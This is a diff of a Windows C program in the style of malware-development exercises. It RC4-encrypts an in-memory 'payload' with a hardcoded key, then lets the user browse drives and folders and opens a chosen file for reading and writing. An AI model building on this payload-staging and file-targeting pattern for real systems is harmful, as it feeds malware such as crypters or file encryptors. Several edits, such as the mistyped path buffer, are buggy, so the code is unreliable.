@@ -11,28 +11,28 @@ int main(void)
 	
 	if (pPayload == NULL) return -5;
 
-	wprintf(L"[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Encrypting Payload...\n", pPayload->pPayloadAddress, pPayload->pPayloadAddress);
+	printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Encrypting Payload...\n", (LPSTR)pPayload->pPayloadAddress, (LPSTR)pPayload->pPayloadAddress);
 
-	unsigned char *pKey = "0xdeadbeef";
+	const unsigned char *pKey = "0xdeadbeef";
 
 	unsigned char *pDecryptedPayload = malloc(pPayload->dwPayloadSize);
 
-	wprintf(L"[i] dwPayloadSize var : %lu \n", pPayload->dwPayloadSize);
+	printf("[i] dwPayloadSize var : %lu \n", pPayload->dwPayloadSize);
 
-	RC4CONTEXT Context = { 0 };
+	RC4CONTEXT context_t = { NULL };
 
-	RC4Init(&Context, pKey, strlen(pKey));
+	RC4Init(&context_t, pKey, strlen(pKey));
 
-	RC4Encrypt(&Context, (unsigned char *)pPayload->pPayloadAddress, pDecryptedPayload, pPayload->dwPayloadSize);
+	RC4Encrypt(&context_t, pPayload->pPayloadAddress, pDecryptedPayload, pPayload->dwPayloadSize);
 
 	pPayload->pPayloadAddress = pDecryptedPayload;
 
-	wprintf(L"[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pDecryptedPayload, pDecryptedPayload);
-	WCHAR pPath[MAX_PATH] = { L'\0' };
+	printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pDecryptedPayload, pDecryptedPayload);
+	LPWSTR pPath[MAX_PATH] = { L'\0' };
 
 	FetchDrives(pPath);
 	
-	if (pPath[0] == L'0')
+	if (pPath[0] == L'\0')
 	{
 		printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError());
 		return -1;
@@ -40,7 +40,7 @@ int main(void)
 	
 	PrintDrives(pPath);
 	
-	while (!UserInputDrives(&pPath))
+	while (!UserInputDrives(pPath))
 	{
 		wprintf(
 			L"[X] Wrong Input!\n"
@@ -50,9 +50,9 @@ int main(void)
 		);
 	}
 	
-	PrintCWD(&pPath);
+	PrintCWD(pPath);
 	
-	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t = FetchFileArrayW(&pPath);
+	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t = FetchFileArrayW(pPath);
 	
 	if (pFiles_arr_t == NULL) 
 	{
@@ -68,17 +68,16 @@ int main(void)
 			printf("[!] No Files Under Current Folder.\n");
 			break;
 		}
-		pFiles_arr_t = RefetchFilesArrayW(&pPath, pFiles_arr_t);
-		if (pFiles_arr_t == NULL) {
-			printf("[!] No Files Under Current Folder.\n");
-			break;
-		}
-		PrintCWD(&pPath);
+
+		pFiles_arr_t = RefetchFilesArrayW(pPath, pFiles_arr_t);
+
+		PrintCWD(pPath);
+
 		PrintFilesArrayW(pFiles_arr_t);
 	}
  	
-	
-	wprintf(L"File Name: %s", *pFiles_arr_t->pFiles_arr->file_data.cFileName);
+	PrintCWD(pPath);
+	wprintf(L"File Name: %s", pFiles_arr_t->pFiles_arr->file_data.cFileName);
 
 	if (pFiles_arr_t->pFiles_arr->file_data.dwFileAttributes & FILE_ATTRIBUTE_NORMAL)
 	{
@@ -95,7 +94,7 @@ int main(void)
 		 */
 	
 	hFile = CreateFileW(
-		&pPath,
+		pPath,
 		GENERIC_READ | GENERIC_WRITE,
 		FILE_SHARE_READ,//(0d1).
 		NULL, //(0d0).
